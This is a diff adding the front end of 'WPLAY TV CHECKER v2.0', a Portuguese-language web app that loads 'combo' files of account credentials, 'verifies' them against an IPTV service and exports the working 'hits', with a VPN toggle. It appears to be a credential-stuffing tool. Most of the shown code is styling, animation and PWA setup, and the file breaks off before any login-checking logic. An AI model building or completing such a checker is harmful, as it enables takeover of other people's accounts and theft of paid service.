@@ -1,0 +1,1627 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WPLAY TV CHECKER v2.0</title>
+    <meta name="description" content="Verificador de contas WPLAY TV">
+    <meta name="theme-color" content="#0a8f08">
+    
+    <!-- Ícones para PWA -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📺</text></svg>">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📺</text></svg>">
+    
+    <!-- Manifest para PWA - será atualizado dinamicamente -->
+    <link rel="manifest" id="pwaManifest" href="">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --primary-color: #00ff88;
+            --secondary-color: #00cc66;
+            --accent-color: #00ffff;
+            --danger-color: #ff0066;
+            --warning-color: #ffaa00;
+            --text-color: #ffffff;
+            --bg-dark: #0a0a0f;
+            --card-bg: rgba(15, 15, 30, 0.7);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --neon-glow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* Canvas para efeito Matrix */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.3;
+        }
+        
+        /* Partículas flutuantes */
+        #particles-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.6;
+        }
+        
+        /* Gradiente animado de fundo */
+        .bg-gradient {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #0a0a0f, #1a1a2e, #16213e, #0f3460);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            z-index: -3;
+            opacity: 0.8;
+        }
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        header {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 255, 255, 0.1));
+            backdrop-filter: blur(20px);
+            padding: 2rem 1rem;
+            text-align: center;
+            border-bottom: 2px solid rgba(0, 255, 136, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.2), transparent);
+            animation: scanline 8s linear infinite;
+        }
+        
+        @keyframes scanline {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .logo {
+            font-family: 'Orbitron', monospace;
+            font-size: 3rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.5)); }
+            to { filter: drop-shadow(0 0 30px rgba(0, 255, 255, 0.8)); }
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+        }
+        
+        main {
+            flex: 1;
+            padding: 3rem 1rem;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2rem;
+        }
+        
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 
+                0 8px 32px rgba(0, 255, 136, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%;
+            max-width: 700px;
+            position: relative;
+            overflow: hidden;
+            transform: perspective(1000px) rotateX(0deg);
+            transition: all 0.3s ease;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            animation: topBorder 3s linear infinite;
+        }
+        
+        @keyframes topBorder {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .card:hover {
+            transform: perspective(1000px) rotateX(2deg) translateY(-5px);
+            box-shadow: 
+                0 15px 40px rgba(0, 255, 136, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+        
+        h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            border-radius: 2px;
+        }
+        
+        .form-group {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+            text-transform: uppercase;
+        }
+        
+        .file-input-wrapper {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .file-input-wrapper input[type=file] {
+            position: absolute;
+            left: -9999px;
+        }
+        
+        .file-input-label {
+            display: block;
+            padding: 1.2rem;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 255, 255, 0.1));
+            border: 2px dashed rgba(0, 255, 136, 0.5);
+            border-radius: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .file-input-label::before {
+            content: '📁';
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 0.5rem;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .file-input-label:hover {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 255, 255, 0.2));
+            border-color: var(--primary-color);
+            transform: scale(1.02);
+        }
+        
+        .file-name {
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+            color: var(--primary-color);
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 2rem;
+        }
+        
+        .btn {
+            position: relative;
+            padding: 1rem 2.5rem;
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            z-index: 1;
+            min-width: 150px;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            z-index: -1;
+            transition: all 0.3s ease;
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .btn:hover::after {
+            width: 300px;
+            height: 300px;
+        }
+        
+        .btn-primary {
+            color: var(--bg-dark);
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.4);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 255, 136, 0.6);
+        }
+        
+        .btn-stop {
+            background: linear-gradient(45deg, var(--danger-color), #ff3366);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 0, 102, 0.4);
+        }
+        
+        .btn-stop:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 0, 102, 0.6);
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(45deg, var(--danger-color), #ff3366);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 0, 102, 0.4);
+        }
+        
+        .btn-secondary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 0, 102, 0.6);
+        }
+        
+        .btn-vpn {
+            background: linear-gradient(45deg, #0066ff, #00ccff);
+            color: white;
+            box-shadow: 0 4px 15px rgba(0, 102, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-vpn::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s;
+        }
+        
+        .btn-vpn:hover::before {
+            animation: shine 0.5s ease-in-out;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .btn-vpn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 102, 255, 0.6);
+        }
+        
+        .btn-download {
+            background: linear-gradient(45deg, #ffaa00, #ff6600);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 170, 0, 0.4);
+        }
+        
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 170, 0, 0.6);
+        }
+        
+        .btn-filter {
+            background: linear-gradient(45deg, #9c27b0, #673ab7);
+            color: white;
+            box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
+        }
+        
+        .btn-filter:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(156, 39, 176, 0.6);
+        }
+        
+        .btn-filter.active {
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            color: var(--bg-dark);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 700px;
+            margin: 2rem 0;
+        }
+        
+        .progress-wrapper {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50px;
+            padding: 5px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .progress-bar {
+            height: 30px;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            border-radius: 50px;
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: progressShine 2s linear infinite;
+        }
+        
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .progress-text {
+            text-align: center;
+            margin-top: 1rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+        }
+        
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            width: 100%;
+            max-width: 700px;
+            margin: 2rem 0;
+        }
+        
+        .stat-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 1.5rem;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
+            animation: pulse 4s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(0.8); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 0.8; }
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
+        }
+        
+        .stat-value {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-label {
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+        }
+        
+        .result-container {
+            width: 100%;
+            max-width: 800px;
+            margin: 2rem 0;
+        }
+        
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+        
+        .result-item {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border-left: 4px solid;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .result-item.hidden {
+            display: none;
+        }
+        
+        .result-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        }
+        
+        .result-item.valid {
+            border-left-color: var(--primary-color);
+            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.1);
+        }
+        
+        .result-item.invalid {
+            border-left-color: var(--danger-color);
+            box-shadow: 0 5px 20px rgba(255, 0, 102, 0.1);
+        }
+        
+        .result-item:hover {
+            transform: translateX(5px);
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+        }
+        
+        .result-status {
+            padding: 0.3rem 1rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .result-status.valid {
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            color: var(--bg-dark);
+        }
+        
+        .result-status.invalid {
+            background: linear-gradient(45deg, var(--danger-color), #ff3366);
+            color: white;
+        }
+        
+        .result-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+        
+        .detail-item {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.8rem;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .detail-label {
+            font-size: 0.8rem;
+            color: var(--accent-color);
+            margin-bottom: 0.3rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .detail-value {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        
+        .vpn-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            padding: 1rem 1.5rem;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            z-index: 100;
+            transition: all 0.3s ease;
+        }
+        
+        .vpn-status:hover {
+            transform: scale(1.05);
+        }
+        
+        .vpn-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--danger-color);
+            position: relative;
+            animation: blink 2s infinite;
+        }
+        
+        .vpn-indicator.active {
+            background: var(--primary-color);
+            box-shadow: 0 0 10px var(--primary-color);
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .vpn-text {
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .install-prompt {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            padding: 1.5rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 350px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: translateY(150%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .install-prompt.show {
+            transform: translateY(0);
+        }
+        
+        .install-prompt-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .install-prompt-icon {
+            font-size: 2rem;
+            margin-right: 1rem;
+        }
+        
+        .install-prompt-title {
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: var(--primary-color);
+        }
+        
+        .install-prompt-text {
+            margin-bottom: 1rem;
+            line-height: 1.5;
+        }
+        
+        .install-prompt-buttons {
+            display: flex;
+            gap: 1rem;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            padding: 1.5rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            max-width: 350px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        .notification.success {
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .notification.error {
+            border-left: 4px solid var(--danger-color);
+        }
+        
+        .notification.warning {
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s linear infinite;
+            margin-right: 0.5rem;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        footer {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 255, 255, 0.1));
+            backdrop-filter: blur(20px);
+            padding: 1.5rem;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2rem;
+            }
+            
+            .button-group {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .vpn-status {
+                top: auto;
+                bottom: 100px;
+                right: 10px;
+                left: 10px;
+            }
+            
+            .install-prompt {
+                left: 10px;
+                right: 10px;
+                max-width: none;
+            }
+            
+            .results-header {
+                flex-direction: column;
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Gradiente animado de fundo -->
+    <div class="bg-gradient"></div>
+    
+    <!-- Canvas para efeito Matrix -->
+    <canvas id="matrix-canvas"></canvas>
+    
+    <!-- Canvas para partículas -->
+    <canvas id="particles-canvas"></canvas>
+    
+    <!-- Indicador de status VPN -->
+    <div class="vpn-status" id="vpnStatus">
+        <div class="vpn-indicator" id="vpnIndicator"></div>
+        <span class="vpn-text" id="vpnText">VPN: OFF</span>
+    </div>
+    
+    <!-- Prompt de instalação PWA -->
+    <div class="install-prompt" id="installPrompt">
+        <div class="install-prompt-header">
+            <div class="install-prompt-icon">📱</div>
+            <div class="install-prompt-title">Instalar Aplicativo</div>
+        </div>
+        <div class="install-prompt-text">
+            Instale o WPLAY TV CHECKER em seu dispositivo para acesso rápido e offline!
+        </div>
+        <div class="install-prompt-buttons">
+            <button id="installButton" class="btn btn-install">Instalar</button>
+            <button id="dismissButton" class="btn btn-secondary">Agora não</button>
+        </div>
+    </div>
+    
+    <header>
+        <div class="logo">WPLAY TV CHECKER</div>
+        <div class="subtitle">v2.0 - CÓDIGO FEITO POR @Negret's player</div>
+    </header>
+    
+    <main>
+        <div class="card">
+            <h2>Painel de Controle</h2>
+            
+            <div class="form-group">
+                <label for="fileInput">Carregar Arquivo de Combos</label>
+                <div class="file-input-wrapper">
+                    <input type="file" id="fileInput" accept=".txt">
+                    <label for="fileInput" class="file-input-label">
+                        <span>Clique para selecionar ou arraste o arquivo aqui</span>
+                        <div class="file-name" id="fileName">Nenhum arquivo selecionado</div>
+                    </label>
+                </div>
+            </div>
+            
+            <div class="button-group">
+                <button id="checkButton" class="btn btn-primary">
+                    <span>Verificar Contas</span>
+                </button>
+                <button id="clearButton" class="btn btn-secondary">
+                    <span>Limpar</span>
+                </button>
+                <button id="downloadButton" class="btn btn-download hidden">
+                    <span>📥 Baixar HITS</span>
+                </button>
+                <button id="vpnButton" class="btn btn-vpn">
+                    <span>Ativar VPN</span>
+                </button>
+            </div>
+        </div>
+        
+        <div class="progress-container hidden" id="progressContainer">
+            <div class="progress-wrapper">
+                <div class="progress-bar" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">Verificando... 0/0 (0%)</div>
+        </div>
+        
+        <div class="stats-container hidden" id="statsContainer">
+            <div class="stat-card">
+                <div class="stat-value" id="totalStat">0</div>
+                <div class="stat-label">Total Verificado</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="validStat">0</div>
+                <div class="stat-label">Válidas (ON)</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="invalidStat">0</div>
+                <div class="stat-label">Inválidas (OFF)</div>
+            </div>
+        </div>
+        
+        <div class="result-container hidden" id="resultContainer">
+            <div class="card">
+                <div class="results-header">
+                    <h2>Resultados da Verificação</h2>
+                    <button id="filterButton" class="btn btn-filter">
+                        <span>Mostrar Apenas Hits</span>
+                    </button>
+                </div>
+                <div id="resultsList"></div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <p>&copy; 2023 WPLAY TV CHECKER v2.0 - Desenvolvido por @Negret's player</p>
+    </footer>
+    
+    <div class="notification" id="notification"></div>
+    
+    <script>
+        // Gerar ícones personalizados usando Canvas
+        function generateIcon(size, color, text) {
+            const canvas = document.createElement('canvas');
+            canvas.width = size;
+            canvas.height = size;
+            const ctx = canvas.getContext('2d');
+            
+            // Fundo
+            ctx.fillStyle = '#0a0a0f';
+            ctx.fillRect(0, 0, size, size);
+            
+            // Gradiente
+            const gradient = ctx.createLinearGradient(0, 0, size, size);
+            gradient.addColorStop(0, '#00ff88');
+            gradient.addColorStop(1, '#00ffff');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, size, size);
+            
+            // Círculo central
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2.5, 0, Math.PI * 2);
+            ctx.fillStyle = '#0a0a0f';
+            ctx.fill();
+            
+            // Texto
+            ctx.fillStyle = gradient;
+            ctx.font = `bold ${size/2.5}px Arial`;
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(text, size/2, size/2);
+            
+            // Converter para data URL
+            return canvas.toDataURL('image/png');
+        }
+        
+        // Gerar diferentes tamanhos de ícones
+        const iconSizes = [72, 96, 128, 144, 152, 192, 384, 512];
+        const icons = [];
+        
+        iconSizes.forEach(size => {
+            icons.push({
+                src: generateIcon(size, '#00ff88', 'WTV'),
+                sizes: `${size}x${size}`,
+                type: 'image/png'
+            });
+        });
+        
+        // Criar manifesto PWA com ícones personalizados
+        const manifest = {
+            name: 'WPLAY TV CHECKER v2.0',
+            short_name: 'WPLAY Checker',
+            start_url: './',
+            display: 'standalone',
+            background_color: '#0a8f08',
+            theme_color: '#0a8f08',
+            icons: icons
+        };
+        
+        // Converter manifesto para string e criar data URL
+        const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
+        const manifestUrl = URL.createObjectURL(manifestBlob);
+        
+        // Definir o manifesto no link
+        document.getElementById('pwaManifest').href = manifestUrl;
+        
+        // Efeito Matrix
+        const matrixCanvas = document.getElementById('matrix-canvas');
+        const matrixCtx = matrixCanvas.getContext('2d');
+        
+        matrixCanvas.width = window.innerWidth;
+        matrixCanvas.height = window.innerHeight;
+        
+        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+        const matrixArray = matrix.split("");
+        
+        const fontSize = 10;
+        const columns = matrixCanvas.width / fontSize;
+        
+        const drops = [];
+        for(let x = 0; x < columns; x++) {
+            drops[x] = 1;
+        }
+        
+        function drawMatrix() {
+            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+            
+            matrixCtx.fillStyle = '#00ff88';
+            matrixCtx.font = fontSize + 'px monospace';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+        
+        // Efeito de partículas
+        const particlesCanvas = document.getElementById('particles-canvas');
+        const particlesCtx = particlesCanvas.getContext('2d');
+        
+        particlesCanvas.width = window.innerWidth;
+        particlesCanvas.height = window.innerHeight;
+        
+        const particles = [];
+        const particleCount = 50;
+        
+        class Particle {
+            constructor() {
+                this.x = Math.random() * particlesCanvas.width;
+                this.y = Math.random() * particlesCanvas.height;
+                this.size = Math.random() * 3 + 1;
+                this.speedX = Math.random() * 2 - 1;
+                this.speedY = Math.random() * 2 - 1;
+                this.color = Math.random() > 0.5 ? '#00ff88' : '#00ffff';
+            }
+            
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                
+                if(this.x > particlesCanvas.width) this.x = 0;
+                if(this.x < 0) this.x = particlesCanvas.width;
+                if(this.y > particlesCanvas.height) this.y = 0;
+                if(this.y < 0) this.y = particlesCanvas.height;
+            }
+            
+            draw() {
+                particlesCtx.fillStyle = this.color;
+                particlesCtx.beginPath();
+                particlesCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                particlesCtx.fill();
+            }
+        }
+        
+        function initParticles() {
+            for(let i = 0; i < particleCount; i++) {
+                particles.push(new Particle());
+            }
+        }
+        
+        function animateParticles() {
+            particlesCtx.clearRect(0, 0, particlesCanvas.width, particlesCanvas.height);
+            
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
+            });
+            
+            requestAnimationFrame(animateParticles);
+        }
+        
+        initParticles();
+        animateParticles();
+        
+        // PWA Install Prompt
+        let deferredPrompt;
+        const installPrompt = document.getElementById('installPrompt');
+        const installButton = document.getElementById('installButton');
+        const dismissButton = document.getElementById('dismissButton');
+        
+        window.addEventListener('beforeinstallprompt', (e) => {
+            // Prevenir o prompt padrão
+            e.preventDefault();
+            // Armazenar o evento para uso posterior
+            deferredPrompt = e;
+            // Mostrar nosso prompt personalizado
+            setTimeout(() => {
+                installPrompt.classList.add('show');
+            }, 3000);
+        });
+        
+        installButton.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                // Mostrar o prompt de instalação
+                deferredPrompt.prompt();
+                // Aguardar a resposta do usuário
+                const { outcome } = await deferredPrompt.userChoice;
+                console.log(`User response to the install prompt: ${outcome}`);
+                // Limpar o prompt
+                deferredPrompt = null;
+                // Esconder nosso prompt personalizado
+                installPrompt.classList.remove('show');
+                showNotification('Aplicativo instalado com sucesso!', 'success');
+            }
+        });
+        
+        dismissButton.addEventListener('click', () => {
+            installPrompt.classList.remove('show');
+        });
+        
+        // Service Worker para PWA
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('data:application/javascript,function%20sw(){self.addEventListener(%22install%22,function(e){self.skipWaiting()});self.addEventListener(%22activate%22,function(e){self.clients.claim()});self.addEventListener(%22fetch%22,function(e){e.respondWith(fetch(e.request))})}sw();')
+                .then(() => console.log('Service Worker registrado'))
+                .catch(err => console.error('Erro ao registrar Service Worker:', err));
+        }
+        
+        // Variáveis globais
+        let results = [];
+        let checking = false;
+        let vpnActive = false;
+        let stopRequested = false;
+        let showOnlyValid = false;
+        
+        // Elementos DOM
+        const fileInput = document.getElementById('fileInput');
+        const fileName = document.getElementById('fileName');
+        const checkButton = document.getElementById('checkButton');
+        const clearButton = document.getElementById('clearButton');
+        const downloadButton = document.getElementById('downloadButton');
+        const vpnButton = document.getElementById('vpnButton');
+        const filterButton = document.getElementById('filterButton');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const statsContainer = document.getElementById('statsContainer');
+        const totalStat = document.getElementById('totalStat');
